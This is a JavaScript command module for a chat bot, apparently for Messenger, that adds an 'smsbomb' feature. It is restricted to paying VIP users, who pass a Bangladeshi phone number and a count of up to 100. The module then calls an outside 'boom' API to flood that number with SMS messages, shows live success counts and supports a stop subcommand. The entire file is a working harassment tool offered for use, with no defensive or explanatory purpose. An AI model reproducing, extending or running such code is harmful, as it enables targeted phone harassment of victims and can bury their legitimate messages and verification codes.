const mongoose = require("mongoose");
const { Schema, model } = mongoose;

const vipSchema = new Schema({
  uid: { type: String, required: true },
  name: { type: String, default: "" },
  expiry: { type: Number, default: 0 }
});
const VIP = mongoose.models.VIP || model("VIP", vipSchema);

function toQuizFont(text) {
  const map = {
    A: "𝐀", B: "𝐁", C: "𝐂", D: "𝐃", E: "𝐄", F: "𝐅", G: "𝐆", H: "𝐇", I: "𝐈", J: "𝐉", K: "𝐊", L: "𝐋", M: "𝐌",
    N: "𝐍", O: "𝐎", P: "𝐏", Q: "𝐐", R: "𝐑", S: "𝐒", T: "𝐓", U: "𝐔", V: "𝐕", W: "𝐖", X: "𝐗", Y: "𝐘", Z: "𝐙",
    a: "𝐚", b: "𝐛", c: "𝐜", d: "𝐝", e: "𝐞", f: "𝐟", g: "𝐠", h: "𝐡", i: "𝐢", j: "𝐣", k: "𝐤", l: "𝐥", m: "𝐦",
    n: "𝐧", o: "𝐨", p: "𝐩", q: "𝐪", r: "𝐫", s: "𝐬", t: "𝐭", u: "𝐮", v: "𝐯", w: "𝐰", x: "𝐱", y: "𝐲", z: "𝐳",
    "0": "𝟎", "1": "𝟏", "2": "𝟐", "3": "𝟑", "4": "𝟒", "5": "𝟓", "6": "𝟔", "7": "𝟕", "8": "𝟖", "9": "𝟗",
    " ": " ", ".": ".", ",": ",", "!": "!", "?": "?", ":": ":", "-": "-", "\n": "\n", "(": "(", ")": ")", "'": "'", "✓": "✓"
  };
  return text.split("").map(char => map[char] || char).join("");
}

async function sendMessageAndReplaceReaction(
  api,
  threadID,
  messageID,
  text,
  finalReaction
) {
  await api.sendMessage(toQuizFont(text), threadID);
  api.setMessageReaction(finalReaction, messageID, () => {}, true);
}

module.exports.config = {
  name: "boom",
  aliases: ["smsbomb", "bomb"],
  version: "1.6.7",
  author: "Bokkor x69",
  description: toQuizFont("Send SMS bomber via boom-sms API (VIP only). Supports start and stop in one command."),
  category: toQuizFont("VIP"),
  cooldown: 5,
  role: 0,
};

module.exports.onStart = async function ({ api, event, args }) {
  const axios = require("axios");
  const senderID = event.senderID;
  const threadID = event.threadID;
  const messageID = event.messageID;
  const baseUrl = "https://core.apis-noob-x69.rf.gd/api";
  const phoneRegex = /^01[3-9]\d{8}$/;

  let activeVIP;
  try {
    activeVIP = await VIP.findOne({ uid: senderID, expiry: { $gt: Date.now() } });
  } catch (e) {
    return sendMessageAndReplaceReaction(api, threadID, messageID, `Database error: ${e.message}`, "❌");
  }

  if (!activeVIP) {
    return sendMessageAndReplaceReaction(
      api,
      threadID,
      messageID,
      "❌ This command is only for VIP users! Type '/vip buy' to get VIP.",
      "❌"
    );
  }

  const subcmd = args[0]?.toLowerCase();

  if (subcmd === "stop") {
    try {
      const res = await axios.get(`${baseUrl}/boom/stop`, { validateStatus: () => true });
      return sendMessageAndReplaceReaction(
        api,
        threadID,
        messageID,
        res.data.message || "Stopped.",
        "✅"
      );
    } catch (e) {
      return sendMessageAndReplaceReaction(
        api,
        threadID,
        messageID,
        `Stop request failed: ${e.message}`,
        "❌"
      );
    }
  }

  const phone = subcmd || "";
  const count = parseInt(args[1], 10) || 1;

  if (!phoneRegex.test(phone)) {
    return sendMessageAndReplaceReaction(
      api,
      threadID,
      messageID,
      "Invalid phone number. Must be BD format like 01XXXXXXXXX",
      "❌"
    );
  }
  if (isNaN(count) || count <= 0) {
    return sendMessageAndReplaceReaction(
      api,
      threadID,
      messageID,
      "Count must be a positive integer.",
      "❌"
    );
  }
  if (count > 100) {
    return sendMessageAndReplaceReaction(
      api,
      threadID,
      messageID,
      "Count too high. Use <= 100.",
      "❌"
    );
  }

  const maskedPhone = phone.substring(0, 2) + "******" + phone.slice(-3);

  let sentInfo = await api.sendMessage(toQuizFont(`⚡ 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐬𝐭𝐚𝐫𝐭𝐞𝐝 𝐟𝐨𝐫 +88${maskedPhone}...\n\n✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: 0`), threadID);
  api.setMessageReaction("⏳", messageID, () => {}, true);

  let statusInterval = null;
  let isCompleted = false;

  const finalizeBoom = async (msgText) => {
    if (isCompleted) return;
    isCompleted = true;
    if (statusInterval) clearInterval(statusInterval);

    api.editMessage(toQuizFont(msgText), sentInfo.messageID, () => {});
    api.setMessageReaction("✅", messageID, () => {}, true);
  };

  try {
    const bombUrl = `${baseUrl}/boom?count=${count}&phone=${phone}`;
    
    
    statusInterval = setInterval(async () => {
      if (isCompleted) return;
      try {
        const statRes = await axios.get(`${baseUrl}/boom/status`, { validateStatus: () => true });
        if (statRes.data) {
          const targetPhone = statRes.data.targetInfo?.phone;
          const isRunning = statRes.data.running;
          const currentSuccess = statRes.data.stats && typeof statRes.data.stats.success === "number" ? statRes.data.stats.success : 0;

          if (isRunning === false) {
            const apiMsg = statRes.data.message || `✓ COMPLETED · TOTAL: ${statRes.data.stats?.total || count} · SUCCESS: ${currentSuccess} · FAILED: ${statRes.data.stats?.fail || 0}`;
            await finalizeBoom(apiMsg);
          } else if (targetPhone === phone) {
            const liveMsg = `⚡ 𝐁𝐨𝐦𝐛𝐢𝐧𝐠 𝐢𝐧 𝐩𝐫𝐨𝐠𝐫𝐞𝐬𝐬...\n𝐏𝐡𝐨𝐧𝐞: +88${maskedPhone}\n\n✅ 𝐒𝐮𝐜𝐜𝐞𝐬𝐬: ${currentSuccess}`;
            api.editMessage(toQuizFont(liveMsg), sentInfo.messageID, () => {});
          }
        }
      } catch (err) {}
    }, 10000);

    
    const bombRes = await axios.get(bombUrl, { validateStatus: () => true });
    const bombData = bombRes.data;

    if (bombRes.status === 403 || bombData.status === "denied") {
      try { await axios.get(`${baseUrl}/boom/stop`, { validateStatus: () => true }); } catch (err) {}
      if (statusInterval) clearInterval(statusInterval);

      const deniedMsg = `🚫 ${bombData.message || "Access Denied"}`;
      api.editMessage(toQuizFont(deniedMsg), sentInfo.messageID, () => {});
      api.setMessageReaction("❌", messageID, () => {}, true);
    } else {
      
      let finalMsg = bombData.message;
      if (!finalMsg && bombData.stats) {
        finalMsg = `✓ COMPLETED · TOTAL: ${bombData.stats.total || count} · SUCCESS: ${bombData.stats.success || 0} · FAILED: ${bombData.stats.fail || 0}`;
      } else if (!finalMsg) {
        finalMsg = `✓ COMPLETED`;
      }
      await finalizeBoom(finalMsg);
    }
  } catch (e) {
    if (statusInterval) clearInterval(statusInterval);
    try { await axios.get(`${baseUrl}/boom/stop`, { validateStatus: () => true }); } catch (err) {}

    const errorMsg = `❌ 𝐁𝐨𝐦𝐛 𝐫𝐞𝐪𝐮𝐞𝐬𝐭 𝐟𝐚𝐢𝐥𝐞𝐝: ${e.message}`;
    api.editMessage(toQuizFont(errorMsg), sentInfo.messageID, () => {});
    api.setMessageReaction("❌", messageID, () => {}, true);
  }
};